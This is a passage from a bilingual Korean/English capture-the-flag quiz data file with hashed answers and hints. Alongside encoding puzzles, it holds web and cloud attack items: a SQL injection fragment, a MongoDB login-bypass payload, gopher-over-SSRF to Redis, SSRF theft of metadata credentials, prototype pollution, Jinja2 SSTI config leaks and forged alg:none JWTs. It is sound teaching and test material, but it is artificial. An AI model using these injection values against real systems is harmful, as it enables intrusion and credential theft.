    "hash": "425c89ed5bb78a7623fae60fd8a6f648488168740fe82cf6ad34caa4d07aa972",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "쿠버네티스의 최소 단위",
      "en": "K8s Smallest Unit"
    },
    "prompt": {
      "ko": "쿠버네티스에서 하나 이상의 컨테이너를 묶어 배포하는 최소 실행 단위의 이름은?",
      "en": "In Kubernetes, what is the smallest deployable unit that groups one or more containers?"
    },
    "hints": {
      "ko": [
        "고래가 무리 지어 다니는 그 무리를 뜻하는 영단어에서 따왔습니다.",
        "`kubectl get ____`"
      ],
      "en": [
        "Named after the English word for a group of whales.",
        "`kubectl get ____`"
      ]
    }
  },
  {
    "id": "t2_jailbreak",
    "tier": 2,
    "cat": "ai",
    "track": "cloud",
    "points": 90,
    "ci": true,
    "hash": "bd168d2f02fe220eb62f5bf0e285b846f9f568af9abb99d578776cb7e9488c70",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "가드레일 우회",
      "en": "Bypassing Guardrails"
    },
    "prompt": {
      "ko": "LLM의 안전 정책을 우회해 거부되어야 할 출력을 끌어내는 기법을 통칭하는 영어 단어는? (한 단어)",
      "en": "What single English word collectively names techniques that bypass an LLM's safety policy to elicit forbidden output?"
    },
    "hints": {
      "ko": [
        "탈옥(脫獄)을 뜻하는 영어.",
        "DAN 프롬프트가 대표적."
      ],
      "en": [
        "English for 'escaping jail'.",
        "The DAN prompt is a classic example."
      ]
    }
  },
  {
    "id": "t3_imds",
    "tier": 3,
    "cat": "cloud",
    "track": "cloud",
    "points": 130,
    "ci": false,
    "hash": "34146ce1ba492ed7acf9a9925a04541645c203d9652183c6e238f55786c8b66f",
    "fmt": "IP 주소 / IP address",
    "title": {
      "ko": "메타데이터의 IP",
      "en": "The Metadata IP"
    },
    "prompt": {
      "ko": "SSRF로 클라우드 인스턴스의 임시 자격증명을 탈취할 때 노리는, 모든 주요 클라우드의 메타데이터 서비스 링크-로컬 IP 주소는?",
      "en": "Which link-local IP address (the metadata service across major clouds) do attackers target via SSRF to steal an instance's temporary keys?"
    },
    "hints": {
      "ko": [
        "169.254.x.x 대역(링크-로컬).",
        "끝이 .169.254 로 끝납니다."
      ],
      "en": [
        "169.254.x.x (link-local) range.",
        "Ends with .169.254."
      ]
    }
  },
  {
    "id": "t3_cryptojacking",
    "tier": 3,
    "cat": "cloud",
    "track": "cloud",
    "points": 130,
    "ci": true,
    "hash": "935ca8d5c7d15c4e3098a6e5fa3309e10e918d9139e3b09e0617151edbb52429",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "남의 계정으로 채굴",
      "en": "Mining on Someone Else's Dime"
    },
    "prompt": {
      "ko": "탈취한 클라우드 계정이나 컨테이너에서 공격자가 몰래 암호화폐를 채굴해 피해자에게 컴퓨팅 비용을 떠넘기는 공격을 가리키는 한 단어(영문)는?",
      "en": "What single English word names the attack in which an intruder secretly mines cryptocurrency on a compromised cloud account or container, sticking the victim with the compute bill?"
    },
    "hints": {
      "ko": [
        "'crypto' + 'hijacking'의 합성어입니다.",
        "`crypto______` — GPU 인스턴스가 갑자기 100% 사용률을 보이면 의심 신호."
      ],
      "en": [
        "A portmanteau of 'crypto' + 'hijacking'.",
        "`crypto______` — GPU instances suddenly at 100% usage is a red flag."
      ]
    }
  },
  {
    "id": "t0_reverse",
    "tier": 0,
    "cat": "crypto",
    "track": "crypto",
    "points": 50,
    "ci": false,
    "hash": "61c05ea1dabd40b8b5429da703790e3deedc8252d8e88471d9dd014b3d04c21d",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "거꾸로 읽기",
      "en": "Read it backwards"
    },
    "prompt": {
      "ko": "문자열을 통째로 뒤집으면 플래그가 됩니다:\n\n`}gnirts_eht_esrever{GALF`",
      "en": "Reverse the whole string to get the flag:\n\n`}gnirts_eht_esrever{GALF`"
    },
    "hints": {
      "ko": [
        "끝에서부터 한 글자씩 읽어 보세요.",
        "JS 콘솔: `\"...\".split(\"\").reverse().join(\"\")`"
      ],
      "en": [
        "Read it from the end.",
        "JS console: `\"...\".split(\"\").reverse().join(\"\")`"
      ]
    }
  },
  {
    "id": "t0_decimal",
    "tier": 0,
    "cat": "crypto",
    "track": "crypto",
    "points": 50,
    "ci": true,
    "hash": "2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "ASCII 십진수",
      "en": "ASCII decimal"
    },
    "prompt": {
      "ko": "각 숫자는 한 글자의 ASCII 코드입니다. 디코딩하세요:\n\n`115 101 99 114 101 116`",
      "en": "Each number is one character's ASCII code. Decode it:\n\n`115 101 99 114 101 116`"
    },
    "hints": {
      "ko": [
        "115 = 0x73 = 's'.",
        "공백으로 나뉜 십진수를 문자로."
      ],
      "en": [
        "115 = 0x73 = 's'.",
        "Space-separated decimals → chars."
      ]
    }
  },
  {
    "id": "t0_octal",
    "tier": 0,
    "cat": "crypto",
    "track": "crypto",
    "points": 50,
    "ci": false,
    "hash": "33d7f97040980680e781fae0f62edd198094584b4935398b511aa3baa88f0bfe",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "8진법의 세계",
      "en": "Base-8 World"
    },
    "prompt": {
      "ko": "공백으로 구분된 8진법(옥탈) ASCII 코드입니다. 디코딩하면 플래그:\n\n`106 114 101 107 173 142 141 163 145 70 137 157 143 164 141 154 175`",
      "en": "Space-separated octal (base-8) ASCII codes. Decode to reveal the flag:\n\n`106 114 101 107 173 142 141 163 145 70 137 157 143 164 141 154 175`"
    },
    "hints": {
      "ko": [
        "각 숫자를 8진법으로 읽어 문자로: `106`(8진) = 70 = 'F'.",
        "16진(hex)·10진(decimal)이 아니라 8진입니다."
      ],
      "en": [
        "Read each number as base-8 → a char: `106`(oct) = 70 = 'F'.",
        "It's base-8, not hex or decimal."
      ]
    }
  },
  {
    "id": "t0_urlenc",
    "tier": 0,
    "cat": "web",
    "track": "web",
    "points": 50,
    "ci": false,
    "hash": "2d8175b670d102d981337025ba9f81d95a880e2131967907715dd5d18197338f",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "퍼센트 인코딩",
      "en": "Percent-encoding"
    },
    "prompt": {
      "ko": "URL 디코딩하면 플래그입니다:\n\n`%46%4C%41%47%7B%75%72%6C%5F%65%6E%63%6F%64%65%64%7D`",
      "en": "URL-decode to reveal the flag:\n\n`%46%4C%41%47%7B%75%72%6C%5F%65%6E%63%6F%64%65%64%7D`"
    },
    "hints": {
      "ko": [
        "`%46` = 'F' 입니다.",
        "JS 콘솔: `decodeURIComponent(\"...\")`"
      ],
      "en": [
        "`%46` = 'F'.",
        "JS console: `decodeURIComponent(\"...\")`"
      ]
    }
  },
  {
    "id": "t0_meta",
    "tier": 0,
    "cat": "web",
    "track": "web",
    "points": 40,
    "ci": false,
    "hash": "b36d9b661bac670467701a72f7c0c77fb9a965dcc6cf2bad0b73c456c4fa3728",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "숨은 메타 태그",
      "en": "The hidden meta tag"
    },
    "prompt": {
      "ko": "HTML `<meta>` 태그 중 `name` 이 `ctf-flag` 인 것의 `content` 값을 찾으세요. (소스 보기 또는 개발자도구)",
      "en": "Find the `content` of the `<meta>` tag whose `name` is `ctf-flag`. (View Source or DevTools)"
    },
    "hints": {
      "ko": [
        "`Ctrl+U` 로 소스를 열고 `meta` 를 검색.",
        "`<meta name=\"ctf-flag\" content=\"...\">`"
      ],
      "en": [
        "Open source with `Ctrl+U`, search `meta`.",
        "`<meta name=\"ctf-flag\" content=\"...\">`"
      ]
    }
  },
  {
    "id": "t0_nato",
    "tier": 0,
    "cat": "crypto",
    "track": "crypto",
    "points": 40,
    "ci": true,
    "hash": "807d0fbcae7c4b20518d4d85664f6820aafdf936104122c5073e7744c46c4b87",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "NATO 음성 알파벳",
      "en": "NATO phonetic alphabet"
    },
    "prompt": {
      "ko": "각 단어의 첫 글자를 모으세요:\n\n`Foxtrot Lima Alpha Golf`",
      "en": "Take the first letter of each word:\n\n`Foxtrot Lima Alpha Golf`"
    },
    "hints": {
      "ko": [
        "Foxtrot=F, Lima=L ...",
        "네 글자 단어입니다."
      ],
      "en": [
        "Foxtrot=F, Lima=L ...",
        "It is a four-letter word."
      ]
    }
  },
  {
    "id": "t1_atbash",
    "tier": 1,
    "cat": "crypto",
    "track": "crypto",
    "points": 70,
    "ci": false,
    "hash": "3607df71397b068e947b788bdf856c24556e861917a3de1c065320d9e7975087",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "아트바시 암호",
      "en": "Atbash cipher"
    },
    "prompt": {
      "ko": "알파벳을 거울처럼 뒤집은(A↔Z, B↔Y) 암호입니다. 복호화하세요:\n\n`UOZT{zgyzhs_nriili}`",
      "en": "The alphabet is mirrored (A↔Z, B↔Y). Decrypt:\n\n`UOZT{zgyzhs_nriili}`"
    },
    "hints": {
      "ko": [
        "아트바시는 자기역원 — 한 번 더 적용.",
        "a→z, b→y, c→x ..."
      ],
      "en": [
        "Atbash is its own inverse — apply again.",
        "a→z, b→y, c→x ..."
      ]
    }
  },
  {
    "id": "t1_a1z26",
    "tier": 1,
    "cat": "crypto",
    "track": "crypto",
    "points": 60,
    "ci": true,
    "hash": "051375546db9782e3debc25e0241edf1d5e5e2ec0f183dd8634ca5b2c8968bb8",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "A1Z26 암호",
      "en": "A1Z26 cipher"
    },
    "prompt": {
      "ko": "a=1, b=2 … z=26 입니다. 숫자를 글자로:\n\n`8-1-3-11`",
      "en": "a=1, b=2 … z=26. Convert numbers to letters:\n\n`8-1-3-11`"
    },
    "hints": {
      "ko": [
        "8=h, 1=a ...",
        "하이픈으로 글자가 구분됩니다."
      ],
      "en": [
        "8=h, 1=a ...",
        "Hyphens separate letters."
      ]
    }
  },
  {
    "id": "t1_basicauth",
    "tier": 1,
    "cat": "web",
    "track": "web",
    "points": 60,
    "ci": true,
    "hash": "371a286d5872a3730d644327581546ec3e658bbf1a3c7f7f0de2bc19905d4402",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "Basic 인증의 인코딩",
      "en": "Basic auth encoding"
    },
    "prompt": {
      "ko": "HTTP Basic 인증은 `사용자:비밀번호` 를 어떤 인코딩으로 변환해 `Authorization` 헤더에 담나요? (암호화가 아닙니다, 한 단어)",
      "en": "HTTP Basic auth puts `user:password` into the `Authorization` header using which encoding? (not encryption — one word)"
    },
    "hints": {
      "ko": [
        "= 로 끝나곤 합니다.",
        "`Authorization: Basic <____>`"
      ],
      "en": [
        "Often ends with =.",
        "`Authorization: Basic <____>`"
      ]
    }
  },
  {
    "id": "t1_redirect",
    "tier": 1,
    "cat": "web",
    "track": "web",
    "points": 60,
    "ci": true,
    "hash": "c3ea99f86b2f8a74ef4145bb245155ff5f91cd856f287523481c15a1959d5fd1",
    "fmt": "숫자 / number",
    "title": {
      "ko": "영구 리다이렉트 코드",
      "en": "Permanent redirect code"
    },
    "prompt": {
      "ko": "자원이 영구적으로 다른 URL로 옮겨졌음을 의미하는 HTTP 상태 코드는? (숫자)",
      "en": "Which HTTP status code means a resource has permanently moved to a new URL? (number)"
    },
    "hints": {
      "ko": [
        "임시 이동은 302입니다.",
        "3 으로 시작하는 세 자리."
      ],
      "en": [
        "Temporary move is 302.",
        "Three digits starting with 3."
      ]
    }
  },
  {
    "id": "t1_creds",
    "tier": 1,
    "cat": "web",
    "track": "web",
    "points": 70,
    "ci": true,
    "hash": "854f23f151c958aefead79d83a8078f145f906f9e769dd6face8989040b162d5",
    "fmt": "사용자:비밀번호 / user:pass",
    "title": {
      "ko": "가로챈 자격증명",
      "en": "Intercepted Login"
    },
    "prompt": {
      "ko": "`Authorization: Basic YWRtaW46czNjcjN0` 헤더를 보았습니다. 디코딩하면 자격증명은?",
      "en": "You saw `Authorization: Basic YWRtaW46czNjcjN0`. Decode it — what is the `user:password` pair?"
    },
    "hints": {
      "ko": [
        "Base64 디코드: `atob(\"...\")`.",
        "형식은 `사용자:비밀번호`."
      ],
      "en": [
        "Base64-decode: `atob(\"...\")`.",
        "Format is `user:password`."
      ]
    }
  },
  {
    "id": "t2_vigenere",
    "tier": 2,
    "cat": "crypto",
    "track": "crypto",
    "points": 100,
    "ci": false,
    "hash": "5f1e51f0d5c864d1933e7dbf22a4d729f015606fdfc72da81a2d718b463898d0",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "비제네르 암호",
      "en": "Vigenère cipher"
    },
    "prompt": {
      "ko": "키 `KEY` 로 암호화된 비제네르 암호문입니다. 복호화하세요:\n\n`PPYQ{zgqilovc_uiwoh_astfov}`",
      "en": "Vigenère ciphertext encrypted with key `KEY`. Decrypt:\n\n`PPYQ{zgqilovc_uiwoh_astfov}`"
    },
    "hints": {
      "ko": [
        "키를 반복해 글자별로 빼세요(비-알파벳은 건너뜀).",
        "CyberChef 'Vigenère Decode', key=KEY."
      ],
      "en": [
        "Subtract the repeating key per letter (skip non-letters).",
        "CyberChef 'Vigenère Decode', key=KEY."
      ]
    }
  },
  {
    "id": "t2_base58",
    "tier": 2,
    "cat": "crypto",
    "track": "crypto",
    "points": 100,
    "ci": false,
    "hash": "0bad4078aae00b415bada62c82f1b4c2e5458232ddcd30f555f08d76893f0f48",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "Base58 인코딩",
      "en": "Base58 encoding"
    },
    "prompt": {
      "ko": "비트코인 주소에 쓰이는 Base58(헷갈리는 0,O,I,l 제외)입니다. 디코딩하세요:\n\n`39rKM3yGEZE4C6b8Tfo1WqhwgtVkrqSu4kex`",
      "en": "Base58 as used by Bitcoin addresses (no 0,O,I,l). Decode:\n\n`39rKM3yGEZE4C6b8Tfo1WqhwgtVkrqSu4kex`"
    },
    "hints": {
      "ko": [
        "Base64 와 다른 문자셋입니다.",
        "CyberChef 'From Base58'."
      ],
      "en": [
        "Different alphabet from Base64.",
        "CyberChef 'From Base58'."
      ]
    }
  },
  {
    "id": "t2_unicode",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 90,
    "ci": false,
    "hash": "84df3ede1622103b20713a96f08f338b13d12913889438227c1cda314505bfff",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "유니코드 이스케이프",
      "en": "Unicode escapes"
    },
    "prompt": {
      "ko": "자바스크립트 유니코드 이스케이프 시퀀스입니다. 디코딩하세요:\n\n`\\u0046\\u004c\\u0041\\u0047\\u007b\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u005f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u005f\\u0073\\u0065\\u0071\\u007d`",
      "en": "JavaScript Unicode escape sequences. Decode:\n\n`\\u0046\\u004c\\u0041\\u0047\\u007b\\u0075\\u006e\\u0069\\u0063\\u006f\\u0064\\u0065\\u005f\\u0065\\u0073\\u0063\\u0061\\u0070\\u0065\\u005f\\u0073\\u0065\\u0071\\u007d`"
    },
    "hints": {
      "ko": [
        "`\\u0046` = 'F' 입니다.",
        "JS 콘솔: 따옴표로 감싸 출력해 보세요."
      ],
      "en": [
        "`\\u0046` = 'F'.",
        "JS console: wrap in quotes and print."
      ]
    }
  },
  {
    "id": "t2_sqlcomment",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 80,
    "ci": true,
    "hash": "d8156bae0c4243d3742fc4e9774d8aceabe0410249d720c855f98afc88ff846c",
    "fmt": "기호 / symbol (2글자 / 2 chars)",
    "title": {
      "ko": "SQL 한 줄 주석",
      "en": "SQL line comment"
    },
    "prompt": {
      "ko": "SQL 인젝션에서 쿼리의 나머지 부분을 주석 처리해 무력화할 때 쓰는, 한 줄 주석을 시작하는 두 글자 기호는? (MySQL/표준)",
      "en": "In SQL injection, which two-character sequence starts a line comment to neutralize the rest of the query? (standard SQL)"
    },
    "hints": {
      "ko": [
        "하이픈 두 개.",
        "`' OR 1=1 __`"
      ],
      "en": [
        "Two hyphens.",
        "`' OR 1=1 __`"
      ]
    }
  },
  {
    "id": "t2_idor",
    "tier": 2,
    "cat": "web",
    "track": "web",
    "points": 80,
    "ci": true,
    "hash": "0b5a52cdc4f5481343077f16476c5afde78732e28c9c5eafbf7f9a9a54a0540d",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "직접 객체 참조 취약점",
      "en": "Insecure direct object reference"
    },
    "prompt": {
      "ko": "권한 검증 없이 `?id=123` 같은 식별자만 바꿔 남의 자원에 접근하는 취약점의 약자(4글자)는?",
      "en": "What 4-letter abbreviation names the bug where changing an identifier like `?id=123` accesses another user's resource without authorization?"
    },
    "hints": {
      "ko": [
        "Insecure Direct Object Reference.",
        "OWASP 접근통제 항목."
      ],
      "en": [
        "Insecure Direct Object Reference.",
        "An OWASP access-control issue."
      ]
    }
  },
  {
    "id": "t3_xormulti",
    "tier": 3,
    "cat": "crypto",
    "track": "crypto",
    "points": 130,
    "ci": false,
    "hash": "4d7f3a95a516778bbf022e50f43434bc1fbb2087fa72b7f8590bb81ac4b897bf",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "반복 키 XOR",
      "en": "Repeating-key XOR"
    },
    "prompt": {
      "ko": "반복 키 `key` 로 XOR된 16진 바이트열입니다. 복호화하세요:\n\n`2d29382c1e0b0e151c0a1110050226000000341d161918`",
      "en": "Hex bytes XORed with the repeating key `key`. Decrypt:\n\n`2d29382c1e0b0e151c0a1110050226000000341d161918`"
    },
    "hints": {
      "ko": [
        "키가 3바이트라 3바이트마다 반복됩니다.",
        "`bytes[i] ^ \"key\"[i % 3]`"
      ],
      "en": [
        "Key is 3 bytes, repeats every 3.",
        "`bytes[i] ^ \"key\"[i % 3]`"
      ]
    }
  },
  {
    "id": "t3_base85",
    "tier": 3,
    "cat": "crypto",
    "track": "crypto",
    "points": 130,
    "ci": false,
    "hash": "35c414948080bf4d04c3531bc1407b234e87910ee4aff2f74d21f4998f252d8a",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "ASCII85 (Base85)",
      "en": "ASCII85 (Base85)"
    },
    "prompt": {
      "ko": "Base85(ASCII85, Adobe 방식, 구분자 없음)로 인코딩됐습니다. 디코딩하세요:\n\n`7SH*<HXUu*Bk]Oa?X[_Y?XdGbAN2Pq`",
      "en": "Encoded with Base85 (ASCII85, Adobe variant, no delimiters). Decode:\n\n`7SH*<HXUu*Bk]Oa?X[_Y?XdGbAN2Pq`"
    },
    "hints": {
      "ko": [
        "Base64보다 조밀합니다(4바이트→5문자).",
        "CyberChef 'From Base85' (alphabet !-u)."
      ],
      "en": [
        "Denser than Base64 (4 bytes→5 chars).",
        "CyberChef 'From Base85' (alphabet !-u)."
      ]
    }
  },
  {
    "id": "t3_elfmagic",
    "tier": 3,
    "cat": "forensics",
    "track": "forensics",
    "points": 110,
    "ci": true,
    "hash": "8f328025f36e3709031daf47458e790a90af6c3a75e7b3b9883b7192ed56d987",
    "fmt": "16진수 / hex",
    "title": {
      "ko": "ELF 매직 넘버",
      "en": "ELF magic number"
    },
    "prompt": {
      "ko": "리눅스 ELF 실행 파일의 첫 4바이트(매직 넘버)를 16진수로 입력하세요. (공백 없이, 소문자)",
      "en": "Enter the first 4 bytes (magic number) of a Linux ELF executable in hex. (no spaces, lowercase)"
    },
    "hints": {
      "ko": [
        "두 번째 바이트부터는 ASCII 'ELF'.",
        "`7f` 다음 `45 4c 46`."
      ],
      "en": [
        "Bytes 2-4 are ASCII 'ELF'.",
        "`7f` then `45 4c 46`."
      ]
    }
  },
  {
    "id": "t3_hmac",
    "tier": 3,
    "cat": "crypto",
    "track": "crypto",
    "points": 110,
    "ci": true,
    "hash": "f9ccd92bb6af4cb45e43113867e61dab39a4e7a2a0a88980a940250637773199",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "키 기반 메시지 인증",
      "en": "Keyed message authentication"
    },
    "prompt": {
      "ko": "JWT의 `HS256` 서명에 쓰이는, 해시 함수와 비밀 키를 결합한 메시지 인증 코드의 약자(4글자)는?",
      "en": "What 4-letter abbreviation is the keyed-hash message authentication code used by JWT `HS256`?"
    },
    "hints": {
      "ko": [
        "Hash-based Message Authentication Code.",
        "`____-SHA256`"
      ],
      "en": [
        "Hash-based Message Authentication Code.",
        "`____-SHA256`"
      ]
    }
  },
  {
    "id": "t3_cbc",
    "tier": 3,
    "cat": "crypto",
    "track": "crypto",
    "points": 120,
    "ci": true,
    "hash": "f1454f676ceb25587d73dec3e5f5e5bba4cb8f075d9478f87e66ae9f11068e2d",
    "fmt": "약어 / acronym",
    "title": {
      "ko": "블록을 사슬로 엮다",
      "en": "Chaining the Blocks"
    },
    "prompt": {
      "ko": "각 평문 블록을 직전 암호문 블록과 결합(첫 블록은 IV 사용)해 사슬처럼 연쇄시키는 블록 암호 운용 모드의 3글자 약자는?",
      "en": "What 3-letter block-cipher mode of operation chains each plaintext block with the previous ciphertext block (using an IV for the first block)? (abbreviation)"
    },
    "hints": {
      "ko": [
        "Cipher Block Chaining.",
        "IV 재사용·패딩 오라클(padding oracle) 공격에 주의해야 하는 모드입니다."
      ],
      "en": [
        "Cipher Block Chaining.",
        "Watch out for IV reuse and padding-oracle attacks."
      ]
    }
  },
  {
    "id": "t3_salt",
    "tier": 3,
    "cat": "crypto",
    "track": "crypto",
    "points": 110,
    "ci": true,
    "hash": "63479ad69a090b258277ec8fba6f99419a2ffb248981510657c944ccd1148e97",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "레인보우 테이블 방어",
      "en": "Defeating Rainbow Tables"
    },
    "prompt": {
      "ko": "레인보우 테이블 공격을 막기 위해 비밀번호를 해싱하기 전에 사용자마다 덧붙이는 무작위 값을 가리키는 한 단어(영문)는?",
      "en": "What single English word names the random per-user value added to a password before hashing to defeat rainbow-table attacks?"
    },
    "hints": {
      "ko": [
        "요리에서 '간을 맞추는' 그 단어와 철자가 같습니다.",
        "같은 비밀번호라도 저장된 해시가 서로 달라지게 만듭니다."
      ],
      "en": [
        "Spelled like the seasoning you add to food.",
        "Makes identical passwords hash to different stored values."
      ]
    }
  },
  {
    "id": "t3_jwtdecode",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 120,
    "ci": false,
    "hash": "41b3f5ba65ff6e30608a08ee8b353cad57562fbe7ed41486e72b6ad74e8381bd",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "JWT는 암호화가 아니다",
      "en": "JWT is not encryption"
    },
    "prompt": {
      "ko": "JWT의 payload는 Base64URL로 인코딩될 뿐 암호화가 아닙니다. 다음 payload를 디코딩해 `flag` 값을 찾으세요:\n\n`eyJmbGFnIjoiRkxBR3tqd3RfcGF5bG9hZF9pc19ub3RfZW5jcnlwdGVkfSJ9`",
      "en": "A JWT payload is only Base64URL-encoded, not encrypted. Decode this payload and read the `flag` value:\n\n`eyJmbGFnIjoiRkxBR3tqd3RfcGF5bG9hZF9pc19ub3RfZW5jcnlwdGVkfSJ9`"
    },
    "hints": {
      "ko": [
        "Base64URL 디코드 → JSON.",
        "`atob` 전에 `-`→`+`, `_`→`/` 치환."
      ],
      "en": [
        "Base64URL-decode → JSON.",
        "Before `atob`, swap `-`→`+`, `_`→`/`."
      ]
    }
  },
  {
    "id": "t3_proto",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 130,
    "ci": true,
    "hash": "30e2af384186b57fda019524ade9f9afe48e815480b993d14ec8dc68251b592a",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "프로토타입을 오염시켜라",
      "en": "Pollute the Prototype"
    },
    "prompt": {
      "ko": "JavaScript 프로토타입 오염(prototype pollution) 공격에서, 병합·복사 로직을 속여 모든 객체의 상위 프로토타입에 속성을 심을 때 페이로드의 키로 사용하는 특수 속성 이름은? (한 단어)",
      "en": "In a JavaScript prototype pollution attack, which special property name is used as the payload key to inject onto every object's parent prototype via a vulnerable merge/copy? (one word)"
    },
    "hints": {
      "ko": [
        "밑줄 두 개로 감싸인 던더(dunder) 속성입니다.",
        "`obj.__?__.polluted = true` 형태로 접근합니다."
      ],
      "en": [
        "It is a double-underscore (dunder) property.",
        "Accessed as `obj.__?__.polluted = true`."
      ]
    }
  },
  {
    "id": "t3_jinjaconfig",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 130,
    "ci": true,
    "hash": "b79606fb3afea5bd1609ed40b622142f1c98125abcfe89a76a661b0e8e343910",
    "fmt": "한 단어 / one word",
    "title": {
      "ko": "설정을 유출하라",
      "en": "Leak the App Settings"
    },
    "prompt": {
      "ko": "Flask/Jinja2 SSTI에서 `{{ ____ }}` 로 접근하면 앱의 SECRET_KEY 등 설정값이 통째로 노출되는, 템플릿 전역 객체의 이름은? (소문자 한 단어)",
      "en": "In Flask/Jinja2 SSTI, which template global object, accessed as `{{ ____ }}`, dumps the app's settings including SECRET_KEY? (one lowercase word)"
    },
    "hints": {
      "ko": [
        "Flask 앱 설정을 담는 딕셔너리형 전역입니다.",
        "앱 객체에서 `app.____` 로 꺼내 쓰는 그 이름입니다."
      ],
      "en": [
        "A dict-like global holding the Flask app settings.",
        "Read off the app object as `app.____`."
      ]
    }
  },
  {
    "id": "t3_jwtnone",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 140,
    "ci": false,
    "hash": "283e5c828024eb91519475544f6bf59eae0da2a89310e5c94a460d7352802a8a",
    "fmt": "FLAG{...}",
    "title": {
      "ko": "서명 없는 토큰",
      "en": "The Unsigned Token"
    },
    "prompt": {
      "ko": "다음 JWT는 `alg: none` 으로 서명 부분이 비어 있어 누구나 위조할 수 있습니다. payload를 Base64URL 디코드해 `flag` 값을 찾으세요:\n\n`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImZsYWciOiJGTEFHe2p3dF9ub25lX2FsZ19mb3JnZXJ5fSIsImFkbWluIjp0cnVlfQ.`",
      "en": "This JWT uses `alg: none` — the signature part is empty, so anyone can forge it. Base64URL-decode the payload and read the `flag` value:\n\n`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImZsYWciOiJGTEFHe2p3dF9ub25lX2FsZ19mb3JnZXJ5fSIsImFkbWluIjp0cnVlfQ.`"
    },
    "hints": {
      "ko": [
        "점(.)으로 나뉜 두 번째 조각이 payload 입니다.",
        "Base64URL 디코드 → JSON 의 `flag` 필드."
      ],
      "en": [
        "The second dot-separated part is the payload.",
        "Base64URL-decode → the `flag` field of the JSON."
      ]
    }
  },
  {
    "id": "t3_ssrf",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 130,
    "ci": true,
    "hash": "9cc1ee455a3363ffc504f40006f70d0c8276648a5d3eb3f9524e94d1b7a83aef",
    "fmt": "스킴 이름 / scheme name",
    "title": {
      "ko": "프로토콜을 바꿔라",
      "en": "Switch the Protocol"
    },
    "prompt": {
      "ko": "SSRF 취약점으로 내부 서비스(예: 인증 없는 Redis)에 임의의 원시 바이트를 밀어 넣으려 합니다. `http://` 로는 원하는 명령을 못 보낼 때, `curl` 도 지원하는 오래된 프로토콜을 이용해 원시 TCP 페이로드를 실어 보내는 비-HTTP URI 스킴은? (한 단어)",
      "en": "Via an SSRF you want to push arbitrary raw bytes into an internal, auth-less service (e.g. Redis). Since `http://` can't carry the exact commands, which non-HTTP URI scheme — an old protocol that `curl` still supports — lets you smuggle a raw TCP payload? (one word)"
    },
    "hints": {
      "ko": [
        "`____://127.0.0.1:6379/_` 형태로 Redis 에 접근합니다.",
        "1991년경의 문서 검색 프로토콜에서 이름을 따왔습니다."
      ],
      "en": [
        "Used as `____://127.0.0.1:6379/_` to reach Redis.",
        "Named after a ~1991 document-retrieval protocol."
      ]
    }
  },
  {
    "id": "t3_nosql",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 130,
    "ci": true,
    "hash": "5f664be5d489773c905edcf99b771251121c7c4539fe760305c424ebda69373a",
    "fmt": "연산자 / operator ($ 포함 / include $)",
    "title": {
      "ko": "같지 않으면 참",
      "en": "True When Not Equal"
    },
    "prompt": {
      "ko": "MongoDB 백엔드 로그인에서 JSON 본문을 보내면 필터에 그대로 들어갑니다. `{\"user\":\"admin\",\"password\":{\"$__\":\"\"}}` 처럼 비밀번호를 '어떤 값과도 같지 않음' 으로 만들어 항상 참이 되게 하는 MongoDB 쿼리 연산자는? (`$` 포함)",
      "en": "A MongoDB-backed login puts your JSON body straight into the query filter. Which MongoDB query operator makes the password field mean 'not equal to anything', so the check is always true — as in `{\"user\":\"admin\",\"password\":{\"$__\":\"\"}}`? (include the `$`)"
    },
    "hints": {
      "ko": [
        "영어 'not equal' 의 줄임말입니다.",
        "`$gt`, `$lt`, `$regex` 같은 비교 연산자 계열."
      ],
      "en": [
        "Short for 'not equal'.",
        "Same family as `$gt`, `$lt`, `$regex`."
      ]
    }
  },
  {
    "id": "t3_cors",
    "tier": 3,
    "cat": "web",
    "track": "web",
    "points": 130,
    "ci": true,
    "hash": "631aada47deaf488bb72eee0873a20472c8f43ff960f2188f66cc41eb3f35428",
    "fmt": "헤더 접미사 / header suffix",
    "title": {
      "ko": "출처를 반사하다",
      "en": "Reflected Origin"
    },
    "prompt": {
      "ko": "취약한 서버가 요청의 `Origin` 을 그대로 `Access-Control-Allow-Origin` 에 반사합니다. 여기에 더해 피해자의 인증 세션(자격증명)까지 실린 교차-출처 요청을 브라우저가 허용하게 하려면, 서버가 반드시 `true` 로 내보내야 하는 응답 헤더는? `Access-Control-Allow-________`",
      "en": "A vulnerable server reflects the request's `Origin` back into `Access-Control-Allow-Origin`. To also let the browser send the victim's authenticated session on that cross-origin request, which response header must the server set to `true`? `Access-Control-Allow-________`"
    },
    "hints": {
      "ko": [
        "자격증명(인증 세션) 전송 허용 여부를 정합니다.",
